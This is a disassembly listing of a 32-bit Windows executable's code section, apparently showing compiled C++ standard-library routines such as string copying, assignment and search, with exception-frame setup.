  406058:	cc                   	int3
  406059:	cc                   	int3
  40605a:	cc                   	int3
  40605b:	cc                   	int3
  40605c:	cc                   	int3
  40605d:	cc                   	int3
  40605e:	cc                   	int3
  40605f:	cc                   	int3
  406060:	55                   	push   %ebp
  406061:	8b ec                	mov    %esp,%ebp
  406063:	51                   	push   %ecx
  406064:	83 c0 04             	add    $0x4,%eax
  406067:	50                   	push   %eax
  406068:	8b ce                	mov    %esi,%ecx
  40606a:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  406071:	e8 6a 0b 00 00       	call   0x406be0
  406076:	8b c6                	mov    %esi,%eax
  406078:	8b e5                	mov    %ebp,%esp
  40607a:	5d                   	pop    %ebp
  40607b:	c3                   	ret
  40607c:	cc                   	int3
  40607d:	cc                   	int3
  40607e:	cc                   	int3
  40607f:	cc                   	int3
  406080:	e9 9b 0d 00 00       	jmp    0x406e20
  406085:	cc                   	int3
  406086:	cc                   	int3
  406087:	cc                   	int3
  406088:	cc                   	int3
  406089:	cc                   	int3
  40608a:	cc                   	int3
  40608b:	cc                   	int3
  40608c:	cc                   	int3
  40608d:	cc                   	int3
  40608e:	cc                   	int3
  40608f:	cc                   	int3
  406090:	55                   	push   %ebp
  406091:	8b ec                	mov    %esp,%ebp
  406093:	6a ff                	push   $0xffffffff
  406095:	68 ba 8f 40 00       	push   $0x408fba
  40609a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4060a0:	50                   	push   %eax
  4060a1:	56                   	push   %esi
  4060a2:	57                   	push   %edi
  4060a3:	a1 18 e0 40 00       	mov    0x40e018,%eax
  4060a8:	33 c5                	xor    %ebp,%eax
  4060aa:	50                   	push   %eax
  4060ab:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4060ae:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4060b4:	8b f1                	mov    %ecx,%esi
  4060b6:	8b 4b 04             	mov    0x4(%ebx),%ecx
  4060b9:	3b f1                	cmp    %ecx,%esi
  4060bb:	73 54                	jae    0x406111
  4060bd:	8b 03                	mov    (%ebx),%eax
  4060bf:	3b c6                	cmp    %esi,%eax
  4060c1:	77 4e                	ja     0x406111
  4060c3:	2b f0                	sub    %eax,%esi
  4060c5:	b8 93 24 49 92       	mov    $0x92492493,%eax
  4060ca:	f7 ee                	imul   %esi
  4060cc:	03 d6                	add    %esi,%edx
  4060ce:	c1 fa 04             	sar    $0x4,%edx
  4060d1:	8b f2                	mov    %edx,%esi
  4060d3:	c1 ee 1f             	shr    $0x1f,%esi
  4060d6:	03 f2                	add    %edx,%esi
  4060d8:	3b 4b 08             	cmp    0x8(%ebx),%ecx
  4060db:	75 07                	jne    0x4060e4
  4060dd:	8b cb                	mov    %ebx,%ecx
  4060df:	e8 bc 0c 00 00       	call   0x406da0
  4060e4:	8b 0b                	mov    (%ebx),%ecx
  4060e6:	8b 7b 04             	mov    0x4(%ebx),%edi
  4060e9:	8d 04 f5 00 00 00 00 	lea    0x0(,%esi,8),%eax
  4060f0:	2b c6                	sub    %esi,%eax
  4060f2:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  4060f5:	33 c9                	xor    %ecx,%ecx
  4060f7:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4060fa:	3b f9                	cmp    %ecx,%edi
  4060fc:	74 48                	je     0x406146
  4060fe:	33 d2                	xor    %edx,%edx
  406100:	51                   	push   %ecx
  406101:	c7 47 14 07 00 00 00 	movl   $0x7,0x14(%edi)
  406108:	89 4f 10             	mov    %ecx,0x10(%edi)
  40610b:	66 89 17             	mov    %dx,(%edi)
  40610e:	50                   	push   %eax
  40610f:	eb 2d                	jmp    0x40613e
  406111:	3b 4b 08             	cmp    0x8(%ebx),%ecx
  406114:	75 07                	jne    0x40611d
  406116:	8b cb                	mov    %ebx,%ecx
  406118:	e8 83 0c 00 00       	call   0x406da0
  40611d:	8b 7b 04             	mov    0x4(%ebx),%edi
  406120:	33 c9                	xor    %ecx,%ecx
  406122:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  406129:	3b f9                	cmp    %ecx,%edi
  40612b:	74 19                	je     0x406146
  40612d:	33 c0                	xor    %eax,%eax
  40612f:	51                   	push   %ecx
  406130:	c7 47 14 07 00 00 00 	movl   $0x7,0x14(%edi)
  406137:	89 4f 10             	mov    %ecx,0x10(%edi)
  40613a:	66 89 07             	mov    %ax,(%edi)
  40613d:	56                   	push   %esi
  40613e:	83 c8 ff             	or     $0xffffffff,%eax
  406141:	e8 fa 05 00 00       	call   0x406740
  406146:	83 43 04 1c          	addl   $0x1c,0x4(%ebx)
  40614a:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40614d:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406154:	59                   	pop    %ecx
  406155:	5f                   	pop    %edi
  406156:	5e                   	pop    %esi
  406157:	8b e5                	mov    %ebp,%esp
  406159:	5d                   	pop    %ebp
  40615a:	c3                   	ret
  40615b:	cc                   	int3
  40615c:	cc                   	int3
  40615d:	cc                   	int3
  40615e:	cc                   	int3
  40615f:	cc                   	int3
  406160:	55                   	push   %ebp
  406161:	8b ec                	mov    %esp,%ebp
  406163:	56                   	push   %esi
  406164:	8b f1                	mov    %ecx,%esi
  406166:	e8 45 f8 ff ff       	call   0x4059b0
  40616b:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  40616f:	74 0a                	je     0x40617b
  406171:	56                   	push   %esi
  406172:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  406178:	83 c4 04             	add    $0x4,%esp
  40617b:	8b c6                	mov    %esi,%eax
  40617d:	5e                   	pop    %esi
  40617e:	5d                   	pop    %ebp
  40617f:	c2 04 00             	ret    $0x4
  406182:	cc                   	int3
  406183:	cc                   	int3
  406184:	cc                   	int3
  406185:	cc                   	int3
  406186:	cc                   	int3
  406187:	cc                   	int3
  406188:	cc                   	int3
  406189:	cc                   	int3
  40618a:	cc                   	int3
  40618b:	cc                   	int3
  40618c:	cc                   	int3
  40618d:	cc                   	int3
  40618e:	cc                   	int3
  40618f:	cc                   	int3
  406190:	55                   	push   %ebp
  406191:	8b ec                	mov    %esp,%ebp
  406193:	6a ff                	push   $0xffffffff
  406195:	68 bc 8d 40 00       	push   $0x408dbc
  40619a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4061a0:	50                   	push   %eax
  4061a1:	51                   	push   %ecx
  4061a2:	56                   	push   %esi
  4061a3:	57                   	push   %edi
  4061a4:	a1 18 e0 40 00       	mov    0x40e018,%eax
  4061a9:	33 c5                	xor    %ebp,%eax
  4061ab:	50                   	push   %eax
  4061ac:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4061af:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4061b5:	8d 79 b0             	lea    -0x50(%ecx),%edi
  4061b8:	8b 07                	mov    (%edi),%eax
  4061ba:	8b 48 04             	mov    0x4(%eax),%ecx
  4061bd:	8d 77 50             	lea    0x50(%edi),%esi
  4061c0:	89 75 f0             	mov    %esi,-0x10(%ebp)
  4061c3:	c7 44 31 b0 34 a9 40 	movl   $0x40a934,-0x50(%ecx,%esi,1)
  4061ca:	00 
  4061cb:	8d 4e b4             	lea    -0x4c(%esi),%ecx
  4061ce:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4061d5:	e8 d6 f7 ff ff       	call   0x4059b0
  4061da:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4061e1:	8b 56 b0             	mov    -0x50(%esi),%edx
  4061e4:	8b 0d 34 a1 40 00    	mov    0x40a134,%ecx
  4061ea:	8b 42 04             	mov    0x4(%edx),%eax
  4061ed:	89 4c 30 b0          	mov    %ecx,-0x50(%eax,%esi,1)
  4061f1:	8b ce                	mov    %esi,%ecx
  4061f3:	ff 15 6c a1 40 00    	call   *0x40a16c
  4061f9:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  4061fd:	74 0a                	je     0x406209
  4061ff:	57                   	push   %edi
  406200:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  406206:	83 c4 04             	add    $0x4,%esp
  406209:	8b c7                	mov    %edi,%eax
  40620b:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40620e:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406215:	59                   	pop    %ecx
  406216:	5f                   	pop    %edi
  406217:	5e                   	pop    %esi
  406218:	8b e5                	mov    %ebp,%esp
  40621a:	5d                   	pop    %ebp
  40621b:	c2 04 00             	ret    $0x4
  40621e:	cc                   	int3
  40621f:	cc                   	int3
  406220:	3b f7                	cmp    %edi,%esi
  406222:	74 62                	je     0x406286
  406224:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  406228:	72 0c                	jb     0x406236
  40622a:	8b 06                	mov    (%esi),%eax
  40622c:	50                   	push   %eax
  40622d:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  406233:	83 c4 04             	add    $0x4,%esp
  406236:	c7 46 14 0f 00 00 00 	movl   $0xf,0x14(%esi)
  40623d:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  406244:	c6 06 00             	movb   $0x0,(%esi)
  406247:	83 7f 14 10          	cmpl   $0x10,0x14(%edi)
  40624b:	73 12                	jae    0x40625f
  40624d:	8b 4f 10             	mov    0x10(%edi),%ecx
  406250:	41                   	inc    %ecx
  406251:	51                   	push   %ecx
  406252:	57                   	push   %edi
  406253:	56                   	push   %esi
  406254:	ff 15 fc a1 40 00    	call   *0x40a1fc
  40625a:	83 c4 0c             	add    $0xc,%esp
  40625d:	eb 0a                	jmp    0x406269
  40625f:	8b 17                	mov    (%edi),%edx
  406261:	89 16                	mov    %edx,(%esi)
  406263:	c7 07 00 00 00 00    	movl   $0x0,(%edi)
  406269:	8b 47 10             	mov    0x10(%edi),%eax
  40626c:	89 46 10             	mov    %eax,0x10(%esi)
  40626f:	8b 4f 14             	mov    0x14(%edi),%ecx
  406272:	89 4e 14             	mov    %ecx,0x14(%esi)
  406275:	c7 47 14 0f 00 00 00 	movl   $0xf,0x14(%edi)
  40627c:	c7 47 10 00 00 00 00 	movl   $0x0,0x10(%edi)
  406283:	c6 07 00             	movb   $0x0,(%edi)
  406286:	8b c6                	mov    %esi,%eax
  406288:	c3                   	ret
  406289:	cc                   	int3
  40628a:	cc                   	int3
  40628b:	cc                   	int3
  40628c:	cc                   	int3
  40628d:	cc                   	int3
  40628e:	cc                   	int3
  40628f:	cc                   	int3
  406290:	55                   	push   %ebp
  406291:	8b ec                	mov    %esp,%ebp
  406293:	56                   	push   %esi
  406294:	8b f1                	mov    %ecx,%esi
  406296:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406299:	57                   	push   %edi
  40629a:	8b 79 10             	mov    0x10(%ecx),%edi
  40629d:	3b fb                	cmp    %ebx,%edi
  40629f:	73 0b                	jae    0x4062ac
  4062a1:	68 a8 a8 40 00       	push   $0x40a8a8
  4062a6:	ff 15 30 a1 40 00    	call   *0x40a130
  4062ac:	2b fb                	sub    %ebx,%edi
  4062ae:	3b c7                	cmp    %edi,%eax
  4062b0:	73 02                	jae    0x4062b4
  4062b2:	8b f8                	mov    %eax,%edi
  4062b4:	3b f1                	cmp    %ecx,%esi
  4062b6:	75 1c                	jne    0x4062d4
  4062b8:	8d 0c 1f             	lea    (%edi,%ebx,1),%ecx
  4062bb:	83 c8 ff             	or     $0xffffffff,%eax
  4062be:	e8 ad 00 00 00       	call   0x406370
  4062c3:	8b c3                	mov    %ebx,%eax
  4062c5:	33 c9                	xor    %ecx,%ecx
  4062c7:	e8 a4 00 00 00       	call   0x406370
  4062cc:	5f                   	pop    %edi
  4062cd:	8b c6                	mov    %esi,%eax
  4062cf:	5e                   	pop    %esi
  4062d0:	5d                   	pop    %ebp
  4062d1:	c2 04 00             	ret    $0x4
  4062d4:	83 ff fe             	cmp    $0xfffffffe,%edi
  4062d7:	76 0b                	jbe    0x4062e4
  4062d9:	68 98 a8 40 00       	push   $0x40a898
  4062de:	ff 15 38 a1 40 00    	call   *0x40a138
  4062e4:	8b 46 14             	mov    0x14(%esi),%eax
  4062e7:	3b c7                	cmp    %edi,%eax
  4062e9:	73 27                	jae    0x406312
  4062eb:	8b 46 10             	mov    0x10(%esi),%eax
  4062ee:	50                   	push   %eax
  4062ef:	57                   	push   %edi
  4062f0:	56                   	push   %esi
  4062f1:	e8 ca 13 00 00       	call   0x4076c0
  4062f6:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4062f9:	85 ff                	test   %edi,%edi
  4062fb:	74 65                	je     0x406362
  4062fd:	b8 10 00 00 00       	mov    $0x10,%eax
  406302:	39 41 14             	cmp    %eax,0x14(%ecx)
  406305:	72 02                	jb     0x406309
  406307:	8b 09                	mov    (%ecx),%ecx
  406309:	39 46 14             	cmp    %eax,0x14(%esi)
  40630c:	72 28                	jb     0x406336
  40630e:	8b 06                	mov    (%esi),%eax
  406310:	eb 26                	jmp    0x406338
  406312:	85 ff                	test   %edi,%edi
  406314:	75 e7                	jne    0x4062fd
  406316:	89 7e 10             	mov    %edi,0x10(%esi)
  406319:	83 f8 10             	cmp    $0x10,%eax
  40631c:	72 0d                	jb     0x40632b
  40631e:	8b 06                	mov    (%esi),%eax
  406320:	c6 00 00             	movb   $0x0,(%eax)
  406323:	5f                   	pop    %edi
  406324:	8b c6                	mov    %esi,%eax
  406326:	5e                   	pop    %esi
  406327:	5d                   	pop    %ebp
  406328:	c2 04 00             	ret    $0x4
  40632b:	8b c6                	mov    %esi,%eax
  40632d:	5f                   	pop    %edi
  40632e:	c6 00 00             	movb   $0x0,(%eax)
  406331:	5e                   	pop    %esi
  406332:	5d                   	pop    %ebp
  406333:	c2 04 00             	ret    $0x4
  406336:	8b c6                	mov    %esi,%eax
  406338:	57                   	push   %edi
  406339:	03 cb                	add    %ebx,%ecx
  40633b:	51                   	push   %ecx
  40633c:	50                   	push   %eax
  40633d:	e8 f0 27 00 00       	call   0x408b32
  406342:	83 c4 0c             	add    $0xc,%esp
  406345:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  406349:	89 7e 10             	mov    %edi,0x10(%esi)
  40634c:	72 0e                	jb     0x40635c
  40634e:	8b 06                	mov    (%esi),%eax
  406350:	c6 04 38 00          	movb   $0x0,(%eax,%edi,1)
  406354:	5f                   	pop    %edi
  406355:	8b c6                	mov    %esi,%eax
  406357:	5e                   	pop    %esi
  406358:	5d                   	pop    %ebp
  406359:	c2 04 00             	ret    $0x4
  40635c:	8b c6                	mov    %esi,%eax
  40635e:	c6 04 38 00          	movb   $0x0,(%eax,%edi,1)
  406362:	5f                   	pop    %edi
  406363:	8b c6                	mov    %esi,%eax
  406365:	5e                   	pop    %esi
  406366:	5d                   	pop    %ebp
  406367:	c2 04 00             	ret    $0x4
  40636a:	cc                   	int3
  40636b:	cc                   	int3
  40636c:	cc                   	int3
  40636d:	cc                   	int3
  40636e:	cc                   	int3
  40636f:	cc                   	int3
  406370:	57                   	push   %edi
  406371:	8b f8                	mov    %eax,%edi
  406373:	8b 46 10             	mov    0x10(%esi),%eax
  406376:	3b c1                	cmp    %ecx,%eax
  406378:	73 0b                	jae    0x406385
  40637a:	68 a8 a8 40 00       	push   $0x40a8a8
  40637f:	ff 15 30 a1 40 00    	call   *0x40a130
  406385:	2b c1                	sub    %ecx,%eax
  406387:	3b c7                	cmp    %edi,%eax
  406389:	73 02                	jae    0x40638d
  40638b:	8b f8                	mov    %eax,%edi
  40638d:	85 ff                	test   %edi,%edi
  40638f:	74 4d                	je     0x4063de
  406391:	8b 56 14             	mov    0x14(%esi),%edx
  406394:	53                   	push   %ebx
  406395:	83 fa 10             	cmp    $0x10,%edx
  406398:	72 04                	jb     0x40639e
  40639a:	8b 1e                	mov    (%esi),%ebx
  40639c:	eb 02                	jmp    0x4063a0
  40639e:	8b de                	mov    %esi,%ebx
  4063a0:	83 fa 10             	cmp    $0x10,%edx
  4063a3:	72 04                	jb     0x4063a9
  4063a5:	8b 16                	mov    (%esi),%edx
  4063a7:	eb 02                	jmp    0x4063ab
  4063a9:	8b d6                	mov    %esi,%edx
  4063ab:	2b c7                	sub    %edi,%eax
  4063ad:	03 d9                	add    %ecx,%ebx
  4063af:	50                   	push   %eax
  4063b0:	03 df                	add    %edi,%ebx
  4063b2:	03 d1                	add    %ecx,%edx
  4063b4:	53                   	push   %ebx
  4063b5:	52                   	push   %edx
  4063b6:	ff 15 fc a1 40 00    	call   *0x40a1fc
  4063bc:	8b 46 10             	mov    0x10(%esi),%eax
  4063bf:	83 c4 0c             	add    $0xc,%esp
  4063c2:	2b c7                	sub    %edi,%eax
  4063c4:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  4063c8:	89 46 10             	mov    %eax,0x10(%esi)
  4063cb:	5b                   	pop    %ebx
  4063cc:	72 0a                	jb     0x4063d8
  4063ce:	8b 0e                	mov    (%esi),%ecx
  4063d0:	c6 04 01 00          	movb   $0x0,(%ecx,%eax,1)
  4063d4:	8b c6                	mov    %esi,%eax
  4063d6:	5f                   	pop    %edi
  4063d7:	c3                   	ret
  4063d8:	8b ce                	mov    %esi,%ecx
  4063da:	c6 04 01 00          	movb   $0x0,(%ecx,%eax,1)
  4063de:	8b c6                	mov    %esi,%eax
  4063e0:	5f                   	pop    %edi
  4063e1:	c3                   	ret
  4063e2:	cc                   	int3
  4063e3:	cc                   	int3
  4063e4:	cc                   	int3
  4063e5:	cc                   	int3
  4063e6:	cc                   	int3
  4063e7:	cc                   	int3
  4063e8:	cc                   	int3
  4063e9:	cc                   	int3
  4063ea:	cc                   	int3
  4063eb:	cc                   	int3
  4063ec:	cc                   	int3
  4063ed:	cc                   	int3
  4063ee:	cc                   	int3
  4063ef:	cc                   	int3
  4063f0:	55                   	push   %ebp
  4063f1:	8b ec                	mov    %esp,%ebp
  4063f3:	83 ec 0c             	sub    $0xc,%esp
  4063f6:	8b 4f 10             	mov    0x10(%edi),%ecx
  4063f9:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  406400:	3b cb                	cmp    %ebx,%ecx
  406402:	0f 82 b0 01 00 00    	jb     0x4065b8
  406408:	8b c1                	mov    %ecx,%eax
  40640a:	2b c3                	sub    %ebx,%eax
  40640c:	3b 45 08             	cmp    0x8(%ebp),%eax
  40640f:	73 03                	jae    0x406414
  406411:	89 45 08             	mov    %eax,0x8(%ebp)
  406414:	8b 55 0c             	mov    0xc(%ebp),%edx
  406417:	8b 52 10             	mov    0x10(%edx),%edx
  40641a:	83 fa ff             	cmp    $0xffffffff,%edx
  40641d:	73 03                	jae    0x406422
  40641f:	89 55 fc             	mov    %edx,-0x4(%ebp)
  406422:	8b d1                	mov    %ecx,%edx
  406424:	2b 55 08             	sub    0x8(%ebp),%edx
  406427:	89 55 f4             	mov    %edx,-0xc(%ebp)
  40642a:	83 ca ff             	or     $0xffffffff,%edx
  40642d:	2b 55 fc             	sub    -0x4(%ebp),%edx
  406430:	3b 55 f4             	cmp    -0xc(%ebp),%edx
  406433:	77 0b                	ja     0x406440
  406435:	68 98 a8 40 00       	push   $0x40a898
  40643a:	ff 15 38 a1 40 00    	call   *0x40a138
  406440:	8b 55 08             	mov    0x8(%ebp),%edx
  406443:	2b c2                	sub    %edx,%eax
  406445:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406448:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40644b:	56                   	push   %esi
  40644c:	8b 75 fc             	mov    -0x4(%ebp),%esi
  40644f:	03 c6                	add    %esi,%eax
  406451:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406454:	3b c8                	cmp    %eax,%ecx
  406456:	73 0f                	jae    0x406467
  406458:	8b f0                	mov    %eax,%esi
  40645a:	8b c7                	mov    %edi,%eax
  40645c:	e8 ef 0c 00 00       	call   0x407150
  406461:	8b 75 fc             	mov    -0x4(%ebp),%esi
  406464:	8b 55 08             	mov    0x8(%ebp),%edx
  406467:	8b 47 14             	mov    0x14(%edi),%eax
  40646a:	3b 7d 0c             	cmp    0xc(%ebp),%edi
  40646d:	74 6a                	je     0x4064d9
  40646f:	83 f8 10             	cmp    $0x10,%eax
  406472:	72 07                	jb     0x40647b
  406474:	8b 0f                	mov    (%edi),%ecx
  406476:	89 4d 08             	mov    %ecx,0x8(%ebp)
  406479:	eb 03                	jmp    0x40647e
  40647b:	89 7d 08             	mov    %edi,0x8(%ebp)
  40647e:	83 f8 10             	cmp    $0x10,%eax
  406481:	72 04                	jb     0x406487
  406483:	8b 07                	mov    (%edi),%eax
  406485:	eb 02                	jmp    0x406489
  406487:	8b c7                	mov    %edi,%eax
  406489:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40648c:	51                   	push   %ecx
  40648d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406490:	03 cb                	add    %ebx,%ecx
  406492:	03 ca                	add    %edx,%ecx
  406494:	03 c3                	add    %ebx,%eax
  406496:	51                   	push   %ecx
  406497:	03 c6                	add    %esi,%eax
  406499:	50                   	push   %eax
  40649a:	ff 15 fc a1 40 00    	call   *0x40a1fc
  4064a0:	8b 45 0c             	mov    0xc(%ebp),%eax
  4064a3:	b9 10 00 00 00       	mov    $0x10,%ecx
  4064a8:	83 c4 0c             	add    $0xc,%esp
  4064ab:	39 48 14             	cmp    %ecx,0x14(%eax)
  4064ae:	72 02                	jb     0x4064b2
  4064b0:	8b 00                	mov    (%eax),%eax
  4064b2:	39 4f 14             	cmp    %ecx,0x14(%edi)
  4064b5:	72 11                	jb     0x4064c8
  4064b7:	8b 0f                	mov    (%edi),%ecx
  4064b9:	56                   	push   %esi
  4064ba:	50                   	push   %eax
  4064bb:	03 cb                	add    %ebx,%ecx
  4064bd:	51                   	push   %ecx
  4064be:	e8 6f 26 00 00       	call   0x408b32
  4064c3:	e9 c6 00 00 00       	jmp    0x40658e
  4064c8:	56                   	push   %esi
  4064c9:	8b cf                	mov    %edi,%ecx
  4064cb:	50                   	push   %eax
  4064cc:	03 cb                	add    %ebx,%ecx
  4064ce:	51                   	push   %ecx
  4064cf:	e8 5e 26 00 00       	call   0x408b32
  4064d4:	e9 b5 00 00 00       	jmp    0x40658e
  4064d9:	3b f2                	cmp    %edx,%esi
  4064db:	77 59                	ja     0x406536
  4064dd:	83 f8 10             	cmp    $0x10,%eax
  4064e0:	72 04                	jb     0x4064e6
  4064e2:	8b 0f                	mov    (%edi),%ecx
  4064e4:	eb 02                	jmp    0x4064e8
  4064e6:	8b cf                	mov    %edi,%ecx
  4064e8:	83 f8 10             	cmp    $0x10,%eax
  4064eb:	72 04                	jb     0x4064f1
  4064ed:	8b 07                	mov    (%edi),%eax
  4064ef:	eb 02                	jmp    0x4064f3
  4064f1:	8b c7                	mov    %edi,%eax
  4064f3:	56                   	push   %esi
  4064f4:	51                   	push   %ecx
  4064f5:	03 c3                	add    %ebx,%eax
  4064f7:	50                   	push   %eax
  4064f8:	ff 15 fc a1 40 00    	call   *0x40a1fc
  4064fe:	8b 47 14             	mov    0x14(%edi),%eax
  406501:	83 c4 0c             	add    $0xc,%esp
  406504:	83 f8 10             	cmp    $0x10,%eax
  406507:	72 04                	jb     0x40650d
  406509:	8b 0f                	mov    (%edi),%ecx
  40650b:	eb 02                	jmp    0x40650f
  40650d:	8b cf                	mov    %edi,%ecx
  40650f:	83 f8 10             	cmp    $0x10,%eax
  406512:	72 11                	jb     0x406525
  406514:	8b 07                	mov    (%edi),%eax
  406516:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406519:	03 cb                	add    %ebx,%ecx
  40651b:	03 4d 08             	add    0x8(%ebp),%ecx
  40651e:	03 c3                	add    %ebx,%eax
  406520:	52                   	push   %edx
  406521:	03 c6                	add    %esi,%eax
  406523:	eb 61                	jmp    0x406586
  406525:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406528:	8b c7                	mov    %edi,%eax
  40652a:	03 cb                	add    %ebx,%ecx
  40652c:	03 4d 08             	add    0x8(%ebp),%ecx
  40652f:	03 c3                	add    %ebx,%eax
  406531:	52                   	push   %edx
  406532:	03 c6                	add    %esi,%eax
  406534:	eb 50                	jmp    0x406586
  406536:	83 f8 10             	cmp    $0x10,%eax
  406539:	72 07                	jb     0x406542
  40653b:	8b 0f                	mov    (%edi),%ecx
  40653d:	89 4d 08             	mov    %ecx,0x8(%ebp)
  406540:	eb 03                	jmp    0x406545
  406542:	89 7d 08             	mov    %edi,0x8(%ebp)
  406545:	83 f8 10             	cmp    $0x10,%eax
  406548:	72 04                	jb     0x40654e
  40654a:	8b 07                	mov    (%edi),%eax
  40654c:	eb 02                	jmp    0x406550
  40654e:	8b c7                	mov    %edi,%eax
  406550:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  406553:	51                   	push   %ecx
  406554:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406557:	03 cb                	add    %ebx,%ecx
  406559:	03 ca                	add    %edx,%ecx
  40655b:	03 c3                	add    %ebx,%eax
  40655d:	51                   	push   %ecx
  40655e:	03 c6                	add    %esi,%eax
  406560:	50                   	push   %eax
  406561:	ff 15 fc a1 40 00    	call   *0x40a1fc
  406567:	8b 47 14             	mov    0x14(%edi),%eax
  40656a:	83 c4 0c             	add    $0xc,%esp
  40656d:	83 f8 10             	cmp    $0x10,%eax
  406570:	72 04                	jb     0x406576
  406572:	8b 0f                	mov    (%edi),%ecx
  406574:	eb 02                	jmp    0x406578
  406576:	8b cf                	mov    %edi,%ecx
  406578:	83 f8 10             	cmp    $0x10,%eax
  40657b:	72 04                	jb     0x406581
  40657d:	8b 07                	mov    (%edi),%eax
  40657f:	eb 02                	jmp    0x406583
  406581:	8b c7                	mov    %edi,%eax
  406583:	56                   	push   %esi
  406584:	03 c3                	add    %ebx,%eax
  406586:	51                   	push   %ecx
  406587:	50                   	push   %eax
  406588:	ff 15 fc a1 40 00    	call   *0x40a1fc
  40658e:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  406591:	83 c4 0c             	add    $0xc,%esp
  406594:	83 7f 14 10          	cmpl   $0x10,0x14(%edi)
  406598:	89 4f 10             	mov    %ecx,0x10(%edi)
  40659b:	5e                   	pop    %esi
  40659c:	72 0e                	jb     0x4065ac
  40659e:	8b 07                	mov    (%edi),%eax
  4065a0:	c6 04 08 00          	movb   $0x0,(%eax,%ecx,1)
  4065a4:	8b c7                	mov    %edi,%eax
  4065a6:	8b e5                	mov    %ebp,%esp
  4065a8:	5d                   	pop    %ebp
  4065a9:	c2 08 00             	ret    $0x8
  4065ac:	8b c7                	mov    %edi,%eax
  4065ae:	c6 04 08 00          	movb   $0x0,(%eax,%ecx,1)
  4065b2:	8b e5                	mov    %ebp,%esp
  4065b4:	5d                   	pop    %ebp
  4065b5:	c2 08 00             	ret    $0x8
  4065b8:	68 a8 a8 40 00       	push   $0x40a8a8
  4065bd:	ff 15 30 a1 40 00    	call   *0x40a130
  4065c3:	cc                   	int3
  4065c4:	cc                   	int3
  4065c5:	cc                   	int3
  4065c6:	cc                   	int3
  4065c7:	cc                   	int3
  4065c8:	cc                   	int3
  4065c9:	cc                   	int3
  4065ca:	cc                   	int3
  4065cb:	cc                   	int3
  4065cc:	cc                   	int3
  4065cd:	cc                   	int3
  4065ce:	cc                   	int3
  4065cf:	cc                   	int3
  4065d0:	55                   	push   %ebp
  4065d1:	8b ec                	mov    %esp,%ebp
  4065d3:	8b 55 10             	mov    0x10(%ebp),%edx
  4065d6:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4065d9:	85 d2                	test   %edx,%edx
  4065db:	75 05                	jne    0x4065e2
  4065dd:	3b 41 10             	cmp    0x10(%ecx),%eax
  4065e0:	76 76                	jbe    0x406658
  4065e2:	53                   	push   %ebx
  4065e3:	56                   	push   %esi
  4065e4:	57                   	push   %edi
  4065e5:	8b 79 10             	mov    0x10(%ecx),%edi
  4065e8:	3b c7                	cmp    %edi,%eax
  4065ea:	73 66                	jae    0x406652
  4065ec:	2b f8                	sub    %eax,%edi
  4065ee:	3b d7                	cmp    %edi,%edx
  4065f0:	77 60                	ja     0x406652
  4065f2:	be 01 00 00 00       	mov    $0x1,%esi
  4065f7:	2b f2                	sub    %edx,%esi
  4065f9:	03 fe                	add    %esi,%edi
  4065fb:	83 79 14 10          	cmpl   $0x10,0x14(%ecx)
  4065ff:	72 02                	jb     0x406603
  406601:	8b 09                	mov    (%ecx),%ecx
  406603:	8d 1c 01             	lea    (%ecx,%eax,1),%ebx
  406606:	8b 45 0c             	mov    0xc(%ebp),%eax
  406609:	0f be 08             	movsbl (%eax),%ecx
  40660c:	57                   	push   %edi
  40660d:	51                   	push   %ecx
  40660e:	53                   	push   %ebx
  40660f:	ff 15 00 a2 40 00    	call   *0x40a200
  406615:	8b f0                	mov    %eax,%esi
  406617:	83 c4 0c             	add    $0xc,%esp
  40661a:	85 f6                	test   %esi,%esi
  40661c:	74 34                	je     0x406652
  40661e:	8b ff                	mov    %edi,%edi
  406620:	8b 45 10             	mov    0x10(%ebp),%eax
  406623:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  406626:	8b d6                	mov    %esi,%edx
  406628:	e8 13 b4 ff ff       	call   0x401a40
  40662d:	85 c0                	test   %eax,%eax
  40662f:	74 2b                	je     0x40665c
  406631:	8b 55 0c             	mov    0xc(%ebp),%edx
  406634:	0f be 02             	movsbl (%edx),%eax
  406637:	2b de                	sub    %esi,%ebx
  406639:	8d 7c 1f ff          	lea    -0x1(%edi,%ebx,1),%edi
  40663d:	57                   	push   %edi
  40663e:	50                   	push   %eax
  40663f:	8d 5e 01             	lea    0x1(%esi),%ebx
  406642:	53                   	push   %ebx
  406643:	ff 15 00 a2 40 00    	call   *0x40a200
